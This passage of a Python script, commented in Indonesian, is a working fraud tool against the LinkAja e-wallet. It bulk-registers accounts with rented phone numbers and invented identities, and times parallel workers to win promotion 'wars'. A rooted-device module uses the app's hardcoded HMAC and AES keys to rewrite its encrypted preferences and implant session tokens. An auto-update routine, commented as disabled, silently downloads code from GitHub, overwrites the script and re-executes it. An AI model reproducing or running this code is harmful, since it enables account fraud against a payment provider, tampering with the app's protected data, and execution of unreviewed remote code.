    actual_balance_deducted = max(0.0, balance - saldo_after)
    actual_bonbal_deducted = max(0.0, bonbal - bonus_after)

    # DETEKSI ANOMALI: Saldo utama tidak terpotong sama sekali padahal nominal butuh saldo utama
    if expected_balance_used > 0 and actual_balance_deducted < (expected_balance_used * 0.8):
        status_code = conf.get("status", "60010011")
        err_msg = (
            f"Transaksi Gantung di Switch LinkAja ({status_code})! "
            f"Saldo Utama BELUM terpotong (masih Rp {int(saldo_after):,}) dan uang belum masuk merchant."
        )
        return False, err_msg, {
            "merchant": merchant_name,
            "nominal": nominal,
            "transactionId": trx_id,
            "gantung": True,
            "saldo_utama_sisa": saldo_after,
            "bonus_sisa": bonus_after,
            "bonbal_used": actual_bonbal_deducted,
            "balance_used": actual_balance_deducted
        }

    return True, conf.get("message", "Sukses (Terkonfirmasi)"), {
        "merchant": merchant_name,
        "nominal": nominal,
        "transactionId": trx_id,
        "pending": False,
        "bonbal_used": actual_bonbal_deducted if actual_bonbal_deducted > 0 else expected_bonbal_used,
        "balance_used": actual_balance_deducted if actual_balance_deducted > 0 else expected_balance_used
    }


class qris:
    inspect_qr = staticmethod(inspect_qr)
    pay_account_qris = staticmethod(pay_account_qris)
    qr_parse = staticmethod(qr_parse)
    qr_inquiry = staticmethod(qr_inquiry)
    qr_confirm = staticmethod(qr_confirm)
    check_account_balance = staticmethod(check_account_balance)



# ============================================================
# LOGIKA APLIKASI UTAMA (BOT WAR ENGINE)
# ============================================================

# KONFIGURASI AUTO-UPDATE SENYAP
# ==========================================
# Dikosongkan agar tidak melakukan auto-update
GITHUB_RAW_URL = "https://raw.githubusercontent.com/canntona/gurih/refs/heads/main/bot.py"

def auto_update():
    """Mengecek pembaruan script ke GitHub. Jika ada versi baru, otomatis update & restart."""
    if not GITHUB_RAW_URL.strip():
        return
    try:
        req = urllib.request.Request(GITHUB_RAW_URL, headers={'User-Agent': 'Mozilla/5.0', 'Cache-Control': 'no-cache'})
        with urllib.request.urlopen(req, context=_SSL_CTX, timeout=5) as response:
            remote_code = response.read().decode('utf-8')

        with open(__file__, "r", encoding="utf-8") as f:
            local_code = f.read()

        if remote_code.strip() and remote_code.strip() != local_code.strip():
            console.print("\n[bold bright_yellow][!] Memperbarui sistem ke versi terbaru dari GitHub...[/bold bright_yellow]")
            with open(__file__, "w", encoding="utf-8") as f:
                f.write(remote_code)
            time.sleep(1)
            os.execv(sys.executable, ['python'] + sys.argv)
    except Exception:
        # Senyap jika offline atau gagal koneksi
        pass

# ==========================================
# UTILITAS LAYAR & HEADER (ANTI-OVERLAP)
# ==========================================
def clear_once():
    """Mengosongkan buffer layar sepenuhnya di Windows (cls) maupun Linux/Termux (clear)."""
    os.system("cls" if os.name == "nt" else "clear")
    sys.stdout.flush()

def print_section_header(title: str, subtitle: str = "", style: str = "bright_cyan"):
    clear_once()
    content = f"[bold {style}]{title}[/]"
    if subtitle:
        content += f"\n[dim]{subtitle}[/]"
    console.print(Panel(content, border_style=style, box=box.ROUNDED, padding=(0, 2)))

# ==========================================
# FUNGSI LOAD API KEY
# ==========================================
def load_api_key():
    api_file = "api.txt"
    if os.path.exists(api_file):
        with open(api_file, "r") as f:
            key = f.read().strip()
            if key:
                return key

    clear_once()
    console.print(
        Panel(
            "[bold yellow][!] API Key OTPInstan belum dikonfigurasi![/]\n"
            "[dim]Masukkan API Key kamu untuk mengaktifkan layanan OTP otomatis.[/]",
            title="[bold cyan]Konfigurasi Awal[/]",
            border_style="bright_yellow",
            box=box.ROUNDED,
            width=65,
        )
    )
    new_key = Prompt.ask("[bold cyan]>> Masukkan API Key OTPInstan[/]").strip()

    with open(api_file, "w") as f:
        f.write(new_key)

    console.print("[bold green][OK] API Key berhasil disimpan ke api.txt![/]\n")
    time.sleep(1)
    return new_key

# === KONFIGURASI API ===
API_KEY_OTP = load_api_key()
PIN_KUNCI = "888999"
APP_VERSION = "4.46.1"
BASE_LA_API = "https://avengers.linkaja.com/v2/api"

# === KONFIGURASI TERMUX ROOT INJECT ===
PACKAGE_LA = "com.telkom.mwallet"
PREF_DIR_LA = f"/data/data/{PACKAGE_LA}/shared_prefs"
PREF_HMAC_KEY_LA = b"HEY TAYOh3y T4y0"
AES_IV_LA = b"HEY TAYOh3y T4y0"
BACKUP_ROOT_LA = os.path.expanduser("~/inject_backup")
SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
STATE_BACKUP_DIR = os.path.join(SCRIPT_DIR, "data", "states", "backup")

FIRST_NAMES = [
    "Aditya", "Agung", "Ahmad", "Aldi", "Ali", "Amir", "Andi", "Angga", "Anisa", "Aqilla",
    "Ardi", "Arief", "Arya", "Aulia", "Bagus", "Bayu", "Bima", "Budi", "Cahya", "Candra",
    "Chairul", "Chandra", "Citra", "Dandi", "Dani", "Darma", "Dedi", "Denny", "Desi", "Dewi",
    "Dian", "Dimas", "Dina", "Dioni", "Doni", "Dwi", "Eko", "Eka", "Eko", "Fajar",
    "Fauzi", "Febri", "Feri", "Fikri", "Firman", "Fitri", "Galih", "Gandi", "Gilang", "Hadi",
    "Hafiz", "Hendra", "Heru", "Ihsan", "Ilham", "Imam", "Indra", "Intan", "Iqbal", "Irfan",
    "Ismail", "Jaka", "Joko", "Joni", "Juli", "Kartika", "Kevin", "Kiki", "Krisna", "Kurniawan",
    "Lestari", "Lia", "Lilis", "Lutfi", "Mahmud", "Marwan", "Maulana", "Mega", "Melati", "Miko",
    "Mohammad", "Muhamad", "Muhammad", "Mulyadi", "Nanda", "Naufal", "Nia", "Niken", "Nina", "Novi",
    "Nur", "Okta", "Pandu", "Putra", "Putri", "Rachmat", "Rahmat", "Raihan", "Raka", "Rama"
]

LAST_NAMES = [
    "Pratama", "Saputra", "Kurniawan", "Nugroho", "Wibowo", "Santoso", "Hidayat", "Setiawan", "Maulana", "Ramadhan",
    "Firmansyah", "Pangestu", "Kusuma", "Wijaya", "Susanto", "Permana", "Hakim", "Fauzi", "Gunawan", "Sanjaya",
    "Rahmawan", "Irawan", "Hermawan", "Purnama", "Lesmana", "Hidayatullah", "Anugrah", "Budiman", "Cahyono", "Darmawan",
    "Fadilah", "Gani", "Hartono", "Iskandar", "Jaya", "Kusnadi", "Lazuardi", "Mulyana", "Nasution", "Oktavian",
    "Prakasa", "Qodir", "Rahardian", "Situmorang", "Tanjung", "Utomo", "Wahyudi", "Yulianto", "Zulkarnain", "Alamsyah",
    "Arif", "Basuki", "Chaniago", "Damanik", "Effendi", "Fauzan", "Gultom", "Hrp", "Johan", "Kadir",
    "Lubis", "Manurung", "Nasrullah", "Omar", "Pasaribu", "Qomar", "Rangkuti", "Siregar", "Tarigan", "Usman",
    "Vebrian", "Wahid", "Yusuf", "Zainal", "Ahyar", "Bachtiar", "Cahyadi", "Dahlan", "Fathur", "Gozali",
    "Hamzah", "Ilyas", "Jaelani", "Kamil", "Lukman", "Munir", "Nurdin", "Prasetyo", "Qosim", "Rasyid",
    "Soleh", "Thohir", "Ubaidillah", "Vallen", "Wahab", "Yahya", "Zainudin", "Akbar", "Dzaky", "Faiz"
]

def generate_random_identity():
    first = random.choice(FIRST_NAMES)
    last = random.choice(LAST_NAMES)
    rand_num = str(random.randint(1000, 9999))
    return f"{first} {last}", f"{first.lower()}.{last.lower()}{rand_num}@gmail.com"

# ==========================================
# FUNGSI HELPER OTP MULTI-SERVER
# ==========================================
def batalkan_pesanan(base_s, srv, order_id):
    if not order_id:
        return
    h = {"X-Api-Key": API_KEY_OTP}
    try:
        if srv == "1":
            h["Content-Type"] = "application/json"
            requests.post(f"{base_s}/cancel.php", headers=h, json={"order_id": order_id}, timeout=5)
        else:
            requests.post(f"{base_s}/cancel.php", headers=h, data={"order_id": order_id}, timeout=5)
    except Exception:
        pass

def cek_status_otp(base_s, order_id):
    try:
        res = requests.get(
            f"{base_s}/check.php",
            params={"order_id": order_id},
            headers={"X-Api-Key": API_KEY_OTP},
            timeout=8
        ).json()
        d = res.get("data", res)
        if isinstance(d, list) and len(d) > 0:
            d = d[0]
        if isinstance(d, dict):
            raw = str(d.get("otp_code", d.get("otp", d.get("sms", ""))))
            m = re.findall(r'\b\d{6}\b', raw)
            return m[0] if m else "".join(filter(str.isdigit, raw))[:6]
    except Exception:
        pass
    return None

# ==========================================
# FUNGSI HELPER SMSBOWER (SERVER 3)
# ==========================================
def load_smsbower_api_key():
    api_file = "smsbower.txt"
    if os.path.exists(api_file):
        with open(api_file, "r", encoding="utf-8") as f:
            key = f.read().strip()
            if key:
                return key

    clear_once()
    console.print(
        Panel(
            "[bold yellow][!] API Key SMSBower belum dikonfigurasi![/]\n"
            "[dim]Kunci ini diperlukan untuk membeli nomor LinkAja otomatis via SMSBower.[/]",
            title="[bold bright_yellow][*] SETUP API KEY SMSBOWER[/]",
            border_style="bright_yellow",
            box=box.ROUNDED,
            expand=False,
        )
    )
    new_key = Prompt.ask("[bold cyan]>> Masukkan API Key SMSBower[/]").strip()
    with open(api_file, "w", encoding="utf-8") as f:
        f.write(new_key)

    console.print("[bold green][OK] API Key berhasil disimpan ke smsbower.txt![/]\n")
    time.sleep(1)
    return new_key

def order_nomor_smsbower(api_key: str, max_price: float = 0.004):
    try:
        r = requests.get(
            "https://smsbower.page/stubs/handler_api.php",
            params={
                "api_key": api_key,
                "action": "getNumberV2",
                "service": "aka",
                "country": 6,
                "maxPrice": str(max_price)
            },
            timeout=10
        )
        text = r.text.strip()
        try:
            j = r.json()
            if isinstance(j, dict) and "phoneNumber" in j:
                return str(j.get("activationId", "")), str(j.get("phoneNumber", ""))
        except Exception:
            pass

        if "ACCESS_NUMBER:" in text:
            parts = text.split(":")
            if len(parts) >= 3:
                return parts[1], parts[2]
        return None, None
    except Exception:
        return None, None

def cek_status_otp_smsbower(api_key: str, order_id: str):
    try:
        r = requests.get(
            "https://smsbower.page/stubs/handler_api.php",
            params={"api_key": api_key, "action": "getStatus", "id": order_id},
            timeout=8
        )
        text = r.text.strip()
        if text.startswith("STATUS_OK:"):
            raw_c = text.split(":", 1)[1].strip()
            m = re.findall(r'\b\d{6}\b', raw_c)
            return m[0] if m else "".join(filter(str.isdigit, raw_c))[:6]
    except Exception:
        pass
    return None

def cancel_order_smsbower(api_key: str, order_id: str):
    if not order_id:
        return
    try:
        requests.get(
            "https://smsbower.page/stubs/handler_api.php",
            params={"api_key": api_key, "action": "setStatus", "status": 8, "id": order_id},
            timeout=8
        )
    except Exception:
        pass

def finish_order_smsbower(api_key: str, order_id: str):
    if not order_id:
        return
    try:
        requests.get(
            "https://smsbower.page/stubs/handler_api.php",
            params={"api_key": api_key, "action": "setStatus", "status": 6, "id": order_id},
            timeout=8
        )
    except Exception:
        pass

# ==========================================
# ENGINE TERMUX ROOT INJECT (MODUL 5)
# ==========================================
class InjectError(Exception):
    pass

def termux_su(cmd: str, input_bytes: bytes = None, timeout: int = 60) -> str:
    p = subprocess.run(["su", "-c", cmd], input=input_bytes, capture_output=True, timeout=timeout)
    blob = p.stdout + p.stderr
    if p.returncode != 0 or b"Permission denied" in blob or b"not found" in blob.lower()[:60]:
        err = p.stderr.decode(errors="replace").strip()[:180] or blob.decode(errors="replace")[:180]
        raise InjectError(f"su '{cmd[:50]}': {err}")
    return p.stdout.decode(errors="replace").strip()

def check_root_termux():
    try:
        out = termux_su("id -u")
        if out.strip() != "0":
            raise InjectError(f"su jalan tapi uid={out} — bukan root")
    except FileNotFoundError:
        raise InjectError("`su` gak ada — HP belum rooted / KernelSU gak kasih grant")
    except subprocess.TimeoutExpired:
        raise InjectError("su timeout — prompt grant mungkin belum di-approve")

def pref_name_hash_la(name: str) -> str:
    return hmac.new(PREF_HMAC_KEY_LA, name.encode(), hashlib.sha512).hexdigest()

def _pref_key_la(keyname: str) -> bytes:
    return keyname.encode().ljust(32, b"\x00")[:32]

def pref_value_encrypt_la(keyname: str, plaintext: bytes) -> str:
    c = AES.new(_pref_key_la(keyname), AES.MODE_CBC, AES_IV_LA)
    n = 16 - len(plaintext) % 16
    padded = plaintext + bytes([n]) * n
    return c.encrypt(padded).hex().upper()

def pref_value_decrypt_la(keyname: str, value_hex: str) -> bytes:
    c = AES.new(_pref_key_la(keyname), AES.MODE_CBC, AES_IV_LA)
    dec = c.decrypt(bytes.fromhex(value_hex))
    return dec[:-dec[-1]]

def load_prefs_xml_la(text: str) -> dict:
    return dict(re.findall(r'<string name="([0-9a-f]+)">([^<]*)</string>', text))

def dump_xml_la(store: dict, orig_text: str) -> str:
    def repl(m):
        h = m.group(1)
        if h in store:
            return f'<string name="{h}">{store[h]}</string>'
        return m.group(0)
    return re.sub(r'<string name="([0-9a-f]+)">[^<]*</string>', repl, orig_text)

def _pull_xml_la(name: str) -> str:
    return termux_su(f"cat {PREF_DIR_LA}/{name}")

def _install_xml_la(name: str, xml_text: str):
    termux_su(f"cat > {PREF_DIR_LA}/{name}", input_bytes=xml_text.encode())

def _device_backup_once_la():
    out = termux_su("ls /data/local/tmp/Core.xml.bak 2>/dev/null || echo NOPE")
    if "Core.xml.bak" in out:
        return
    termux_su(f"cp {PREF_DIR_LA}/Core.xml /data/local/tmp/Core.xml.bak && cp {PREF_DIR_LA}/Security.xml /data/local/tmp/Security.xml.bak")
    console.print("  [dim][+] Backup device pertama -> /data/local/tmp/*.bak[/]")

def inject_termux_account(state_file_path: str):
    t0 = time.time()
    try:
        with open(state_file_path, "r") as f:
            st = json.load(f)
        m, ident, shared = st.get("msisdn"), st.get("ident"), st.get("shared")
        jwt, rt = st.get("jwt"), st.get("refreshToken")
        if not (jwt and rt and ident and shared):
            raise InjectError("State rusak atau belum selesai daftar (tidak ada token)")
    except Exception as e:
        raise InjectError(f"Gagal baca JSON: {e}")

    with console.status("[bold magenta]Menjalankan proses Inject Root...[/]", spinner="line") as status:
        status.update("[cyan][*] Memeriksa akses Root (Superuser)...[/]")
        check_root_termux()
        console.print("  [green][OK][/] Akses Root terverifikasi")

        status.update("[cyan][*] Membaca konfigurasi XML aplikasi...[/]")
        try:
            core_xml = _pull_xml_la("Core.xml")
            sec_xml = _pull_xml_la("Security.xml")
        except InjectError as e:
            raise InjectError(f"Gagal baca prefs app LinkAja (pastikan sudah pernah login sekali): {e}")

        core, sec = load_prefs_xml_la(core_xml), load_prefs_xml_la(sec_xml)

        token_json = json.dumps({"token": jwt, "refreshToken": rt}, separators=(",", ":"))
        reps_core = {
            "DEVICE_ID": ident["deviceId"],
            "IMSI": ident["imsi"],
            "ADS_ID": ident.get("adsId", ""),
            "USER_PHONE_NUMBER": m,
            "AUTHORIZATION_TOKEN": token_json,
        }
        reps_sec = {"keyX1": shared["key1"], "keyX2": shared["key2"], "keyX3": shared["key3"]}

        for store, reps, fname in ((core, reps_core, "Core.xml"), (sec, reps_sec, "Security.xml")):
            for name in reps:
                if pref_name_hash_la(name) not in store:
                    raise InjectError(f"Entry XML '{name}' tidak ketemu di {fname} — app LinkAja HP ini belum pernah login. Batal.")
        console.print("  [green][OK][/] Struktur XML valid")

        status.update("[cyan][*] Mencadangkan XML asli...[/]")
        _device_backup_once_la()
        bdir = os.path.join(BACKUP_ROOT_LA, m)
        os.makedirs(bdir, exist_ok=True)
        stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        with open(os.path.join(bdir, f"Core.xml.{stamp}.orig"), "w") as f:
            f.write(core_xml)
        with open(os.path.join(bdir, f"Security.xml.{stamp}.orig"), "w") as f:
            f.write(sec_xml)
        console.print("  [green][OK][/] Cadangan lokal tersimpan")

        status.update("[cyan][*] Mengenkripsi sesi & menyusun XML baru...[/]")
        for store, reps in ((core, reps_core), (sec, reps_sec)):
            for name, val in reps.items():
                store[pref_name_hash_la(name)] = pref_value_encrypt_la(name, val.encode())

        core_new = dump_xml_la(core, core_xml)
        sec_new = dump_xml_la(sec, sec_xml)

        status.update("[cyan][*] Menghentikan paksa aplikasi & memasang sesi...[/]")
        termux_su(f"am force-stop {PACKAGE_LA}")
        _install_xml_la("Core.xml", core_new)
        _install_xml_la("Security.xml", sec_new)
        console.print("  [green][OK][/] Sesi baru berhasil dipasang ke sistem")

        status.update("[cyan][*] Memindahkan file state ke arsip backup...[/]")
        os.makedirs(STATE_BACKUP_DIR, exist_ok=True)
        dest = os.path.join(STATE_BACKUP_DIR, os.path.basename(state_file_path))
        if os.path.exists(dest):
            base, ext = os.path.splitext(os.path.basename(state_file_path))
            dest = os.path.join(STATE_BACKUP_DIR, f"{base}_{stamp}{ext}")
        shutil.move(state_file_path, dest)

    el = round(time.time() - t0, 1)
    console.print(
        Panel(
            f"[bold green][OK] Akun {m} sukses terpasang dalam {el} detik![/]\n"
            "[bright_white]Silakan buka aplikasi LinkAja sekarang, akun otomatis masuk.[/]",
            border_style="bright_green",
            box=box.ROUNDED,
        )
    )

# ==========================================
# MENU 1 & 2: PENDAFTARAN & AUTO BULK
# ==========================================
def menu_daftar_manual():
    print_section_header(
        "[*] Daftar Akun Manual",
        "OTP masuk ke SMS HP kamu sendiri.",
        style="bright_yellow"
    )
    # Validasi saklar status config.json
    cfg = get_remote_config(force=True)
    if cfg.get("status", "ON").upper() != "ON":
        msg = cfg.get("message", "Server Sibuk - 503 Service Unavailable-HTTP/1.1 503 Service Unavailable")
        console.print(f"\n[bold red][X] {msg}[/bold red]\n")
        return

    try:
        msisdn = regis.normalize_msisdn(Prompt.ask("[bold cyan]>> Nomor HP[/] [dim](mis. 08123456789)[/]"))
        console.print(f"[green][OK] Nomor tervalidasi:[/] [bold]{msisdn}[/]")
    except RegisError as e:
        console.print(f"[bold red][X] {e}[/]")
        return

# State terpusat untuk Live Dashboard Multi-Worker
WORKER_STATUS = {}
WORKER_LOCK = threading.Lock()
WORKER_EVENT = threading.Event()

def parse_target_time(val: str):
    """Mendukung format jam HH:MM:SS, HH:MM:SS.fff, HH:MM:SS:fff (titik dua), atau HH:MM:SS,fff."""
    val = val.strip()
    parts = val.split(":")
    if len(parts) == 4:
        val = f"{parts[0]}:{parts[1]}:{parts[2]}.{parts[3]}"
    elif "," in val:
        val = val.replace(",", ".")

    for fmt in ("%H:%M:%S.%f", "%H:%M:%S"):
        try:
            return datetime.strptime(val, fmt).time()
        except ValueError:
            pass
    raise ValueError(f"Format waktu tidak valid: {val}. Gunakan HH:MM:SS atau HH:MM:SS.fff")

def update_worker_ui(worker_id, **kwargs):
    with WORKER_LOCK:
        if worker_id not in WORKER_STATUS:
            WORKER_STATUS[worker_id] = {
                "msisdn": "-",
                "attempt": "0/3",
                "otp": "-",
                "identity": "-",
                "status": "",
                "state": "init",  # init, ready, success, failed
                "fullname": "",
                "email": "",
                "finish_time": "",
                "rtt_ms": 0,
                "error": ""
            }
        WORKER_STATUS[worker_id].update(kwargs)
    WORKER_EVENT.set()

POOL_PRIMED = False
POOL_PRIME_LOCK = threading.Lock()

def reset_pool_primed():
    global POOL_PRIMED
    with POOL_PRIME_LOCK:
        POOL_PRIMED = False

def ensure_pool_primed(n_workers=10):
    global POOL_PRIMED
    with POOL_PRIME_LOCK:
        if not POOL_PRIMED:
            POOL_PRIMED = True
            prime_connection_pool(n_workers)

def render_bulk_clean_list(target_mulai, target_kirim, jumlah_akun):
    lines = []
    tm = target_mulai.strip() if target_mulai and target_mulai.strip() else "Instan"
    tgt = target_kirim.strip() if target_kirim and target_kirim.strip() else "Instan"
    lines.append(f"[bold bright_cyan][*] Jam Mulai     :[/] [bold bright_yellow]{tm}[/]")
    lines.append(f"[bold bright_cyan][*] Target Tembak :[/] [bold bright_yellow]{tgt}[/] [dim]({jumlah_akun} Worker Siaga)[/]")
    lines.append("[dim]----------------------------------------------------------------------[/]")
    with WORKER_LOCK:
        for wid in range(1, jumlah_akun + 1):
            info = WORKER_STATUS.get(wid, {})
            st = info.get("state", "init")
            if st in ("init", "running", "idle"):
                lines.append(f"[bold bright_green][{wid}][/]")
            elif st == "ready":
                msisdn = info.get("msisdn", "-")
                fullname = info.get("fullname", "-")
                email = info.get("email", "-")
                lines.append(f"[bold bright_green][{wid}][/] [bold bright_yellow]Siap..[/] [bright_white]{msisdn}[/] | [bold cyan]{fullname}[/] | [dim]{email}[/]")
            elif st == "success":
                waktu = info.get("finish_time", "")
                rtt = info.get("rtt_ms", 0)
                msisdn = info.get("msisdn", "-")
                fullname = info.get("fullname", "-")
                lines.append(f"[bold bright_green][{wid}][/] [dim][{waktu}][/] [bold bright_green]SUKSES[/] [dim]({rtt:.0f}ms)[/]  [bright_white]{msisdn}[/] | [cyan]{fullname}[/]")
            elif st == "failed":
                waktu = info.get("finish_time", datetime.now().strftime("%H:%M:%S"))
                err = info.get("error", "Gagal")
                msisdn = info.get("msisdn", "")
                m_str = f"  {msisdn}" if msisdn and msisdn != "-" else ""
                lines.append(f"[bold bright_green][{wid}][/] [dim][{waktu}][/] [bold red]GAGAL[/]{m_str} [dim]({err})[/]")
            else:
                lines.append(f"[bold bright_green][{wid}][/]")
    return "\n".join(lines)

def build_bulk_dashboard(harga_info, pilihan_server, target_mulai, target_kirim):
    return render_bulk_clean_list(target_mulai, target_kirim, len(WORKER_STATUS) or 10)

def worker_register_scheduled(worker_id, target_mulai, target_kirim_data, pilihan_server, config_api):
    sekarang = datetime.now()
    dt_mulai = None
    dt_kirim = None
    batas_aman = None

    base_url = "https://otpinstan.com/api/reseller"
    base_s = f"{base_url}/s1" if pilihan_server == "1" else base_url

    if target_mulai.strip():
        jam_mulai = parse_target_time(target_mulai)
        dt_mulai = datetime.combine(sekarang.date(), jam_mulai)
        if dt_mulai < sekarang:
            dt_mulai += timedelta(days=1)

    if target_kirim_data.strip():
        jam_kirim = parse_target_time(target_kirim_data)
        patokan_hari = dt_mulai.date() if dt_mulai else sekarang.date()
        dt_kirim = datetime.combine(patokan_hari, jam_kirim)
        if dt_kirim < (dt_mulai if dt_mulai else sekarang):
            dt_kirim += timedelta(days=1)
        batas_aman = dt_kirim - timedelta(seconds=20)

    if dt_mulai:
        while datetime.now() < dt_mulai:
            time.sleep(1)

    service_id = config_api["service_id"]
    country_id = config_api["country_id"]
    provider_id = config_api["provider_id"]

    maksimal_ganti_nomor = 3
    otp_code = None
    msisdn = None

    # Cek status saklar config.json (lokal / remote)
    cfg = get_remote_config()
    if cfg.get("status", "ON").upper() != "ON":
        msg = cfg.get("message", "Server Sibuk - 503 Service Unavailable-HTTP/1.1 503 Service Unavailable")
        update_worker_ui(worker_id, state="failed", error=msg)
        return

    # --- SISTEM 3 STRIKES (DI LATAR BELAKANG) ---
    for attempt in range(1, maksimal_ganti_nomor + 1):
        if batas_aman and datetime.now() >= batas_aman:
            update_worker_ui(worker_id, state="failed", error="Zona Merah")
            return

        order_id = None
        raw_number = None
        sess = None

        for tarik_attempt in range(20):
            try:
                if str(pilihan_server) == "3":
                    api_key_sb = config_api.get("api_key")
                    # Paralel: Order nomor SMSBower + Key Agreement LinkAja serentak (hemat ~1.26 detik)
                    with concurrent.futures.ThreadPoolExecutor(max_workers=2) as ex:
                        fut_order = ex.submit(order_nomor_smsbower, api_key_sb, config_api.get("max_price", 0.004))
                        fut_sess = ex.submit(session.key_agreement)
                        order_id, raw_number = fut_order.result()
                        try:
                            sess = fut_sess.result()
                        except Exception:
                            sess = None
                    if not order_id or not raw_number:
                        time.sleep(1.0)
                        continue
                    break
                elif pilihan_server == "1":
                    headers_post = {"X-Api-Key": API_KEY_OTP, "Content-Type": "application/json"}
                    payload = {"platform_id": int(service_id), "country_id": int(country_id)}
                    res_o = requests.post(f"{base_s}/order.php", headers=headers_post, json=payload, timeout=10).json()
                else:
                    headers_post = {"X-Api-Key": API_KEY_OTP}
                    payload = {"service": service_id, "country": country_id, "provider_id": provider_id}
                    res_o = requests.post(f"{base_s}/order.php", headers=headers_post, data=payload, timeout=10).json()

                if not res_o.get("success") and not res_o.get("status"):
                    msg = str(res_o.get("message", "Habis")).lower()
                    if "saldo" in msg or "limit" in msg:
                        update_worker_ui(worker_id, state="failed", error="Saldo OTP Habis")
                        return
                    else:
                        time.sleep(1.0)
                        continue

                data_order = res_o.get('data', res_o)
                order_id = data_order.get('order_id', data_order.get('id'))
                raw_number = data_order.get('phone', data_order.get('number'))
                break
            except Exception:
                time.sleep(1.5)
                continue

        if not order_id:
            continue

        try:
            msisdn = regis.normalize_msisdn(raw_number)
            if str(pilihan_server) != "3":
                already_registered, info = regis.step_check(msisdn)
                if already_registered:
                    try:
                        state_path(msisdn).unlink(missing_ok=True)
                    except Exception:
                        pass
                    continue
        except (RegisError, Exception):
            try:
                state_path(msisdn).unlink(missing_ok=True)
            except Exception:
                pass
            continue

        try:
            regis.step_send_otp(msisdn, sess=sess)
        except (RegisError, Exception):
            try:
                state_path(msisdn).unlink(missing_ok=True)
            except Exception:
                pass
            continue

        # --- ARGOMETER 55 DETIK (CEK SETIAP 2 DETIK AGAR CEPAT TERDETEKSI) ---
        total_cek = 55 // 2
        for i in range(total_cek):
            if batas_aman and datetime.now() >= batas_aman:
                update_worker_ui(worker_id, state="failed", error="Zona Merah", msisdn=msisdn or "-")
                if str(pilihan_server) == "3" and order_id:
                    cancel_order_smsbower(config_api.get("api_key"), order_id)
                return
            time.sleep(2)
            if str(pilihan_server) == "3":
                otp_code = cek_status_otp_smsbower(config_api.get("api_key"), order_id)
            else:
                otp_code = cek_status_otp(base_s, order_id)
            if otp_code:
                break

        if otp_code:
            break
        else:
            if str(pilihan_server) == "3" and order_id:
                cancel_order_smsbower(config_api.get("api_key"), order_id)
            try:
                state_path(msisdn).unlink(missing_ok=True)
            except Exception:
                pass
            continue

    if not otp_code:
        update_worker_ui(worker_id, state="failed", error="OTP Zonk (3x)", msisdn=msisdn or "-")
        return

    # --- FASE EKSEKUSI & VALIDASI ---
    fullname, email = generate_random_identity()
    pin = PIN_KUNCI

    try:
        regis.step_validate(msisdn, otp_code)
    except (RegisError, Exception) as exc:
        update_worker_ui(worker_id, state="failed", error=f"Val: {exc}", msisdn=msisdn)
        try:
            state_path(msisdn).unlink(missing_ok=True)
        except Exception:
            pass
        return

    # [OPTIMASI]: Pre-build Payload pendaftaran di memory RAM sebelum cut-off
    target_ts = int(dt_kirim.timestamp() * 1000) if dt_kirim else int(time.time() * 1000)
    try:
        prebuilt = regis.prepare_register_payload(
            msisdn=msisdn,
            pin=pin,
            fullname=fullname,
            email=email,
            target_ts=target_ts
        )
        # Menampilkan baris Siap.. begitu data siap di RAM
        update_worker_ui(
            worker_id,
            state="ready",
            msisdn=msisdn,
            fullname=fullname,
            email=email
        )
    except Exception as e:
        update_worker_ui(worker_id, state="failed", error=f"Prebuild: {e}", msisdn=msisdn)
        return

    primed = False
    if dt_kirim:
        # CUT-OFF GUARD 1: Jika waktu saat data siap sudah melewati target, jangan tembak!
        if datetime.now() >= dt_kirim:
            update_worker_ui(worker_id, state="failed", error="Lewat Target", msisdn=msisdn)
            if str(pilihan_server) == "3" and order_id:
                cancel_order_smsbower(config_api.get("api_key"), order_id)
            try:
                state_path(msisdn).unlink(missing_ok=True)
            except Exception:
                pass
            return

        while True:
            sisa = (dt_kirim - datetime.now()).total_seconds()
            
            # Priming/Warm-up seluruh soket pool di background thread T-10 detik (NON-BLOCKING!)
            if not primed and sisa <= 10.0:
                primed = True
                threading.Thread(target=ensure_pool_primed, args=(len(WORKER_STATUS) or 10,), daemon=True).start()

            if sisa <= 0:
                break
            elif sisa > 1.0:
                time.sleep(0.1)
            elif sisa > 0.1:
                time.sleep(0.01)
            elif sisa > 0.005:
                time.sleep(0.001)
            else:
                # Spinlock sub-milidetik untuk 5 ms terakhir
                pass
    else:
        # Kirim langsung: Priming connection agar socket warm
        session.prime_connection()

    # CUT-OFF GUARD 2: Jangan tembak jika eksekusi tertunda > 2.5 detik melewati cut-off
    if dt_kirim and (datetime.now() - dt_kirim).total_seconds() > 2.5:
        update_worker_ui(worker_id, state="failed", error="Terlewat Cutoff", msisdn=msisdn)
        if str(pilihan_server) == "3" and order_id:
            cancel_order_smsbower(config_api.get("api_key"), order_id)
        try:
            state_path(msisdn).unlink(missing_ok=True)
        except Exception:
            pass
        return

    try:
        # Eksekusi Pre-built payload instan (timeout 10.0s untuk menampung antrean war LinkAja)
        d, rtt_ms = regis.execute_register_payload(prebuilt, async_save=True, timeout=30.0)
        waktu_sukses = datetime.now().strftime('%H:%M:%S.%f')[:-3]
        update_worker_ui(
            worker_id,
            state="success",
            finish_time=waktu_sukses,
            rtt_ms=rtt_ms,
            msisdn=msisdn,
            fullname=fullname
        )
        if str(pilihan_server) == "3" and order_id:
            finish_order_smsbower(config_api.get("api_key"), order_id)
        return
    except Exception as exc:
        update_worker_ui(
            worker_id,
            state="failed",
            finish_time=datetime.now().strftime('%H:%M:%S'),
            error=str(exc)[:40],
            msisdn=msisdn
        )
        if str(pilihan_server) == "3" and order_id:
            cancel_order_smsbower(config_api.get("api_key"), order_id)
        try:
            state_path(msisdn).unlink(missing_ok=True)
        except Exception:
            pass
        return

def menu_daftar_auto_bulk():
    print_section_header(
        "[*] Daftar Akun Massal Berjadwal (Scheduled Bulk)",
        "Menjalankan beberapa worker pendaftaran secara paralel dengan monitor real-time.",
        style="bright_yellow"
    )
    # Validasi saklar dan batasan akun dari config.json (sebelum prompt server)
    cfg = get_remote_config(force=True)
    if cfg.get("status", "ON").upper() != "ON":
        msg = cfg.get("message", "Server Sibuk - 503 Service Unavailable-HTTP/1.1 503 Service Unavailable")
        console.print(f"\n[bold red][X] {msg}[/bold red]\n")
        return

    console.print(
        "[bold cyan]Pilihan Server OTP:[/]\n"
        "  [bold bright_white]1.[/] OTPInstan - Server 1 (Standar)\n"
        "  [bold bright_white]2.[/] OTPInstan - Server 2 (Operator Pilihan)\n"
        "  [bold bright_white]3.[/] SMSBower   - Server Murah ($0.004 / ~Rp 64)\n"
    )

    # Kunci batas keras maksimal 5 akun per bot
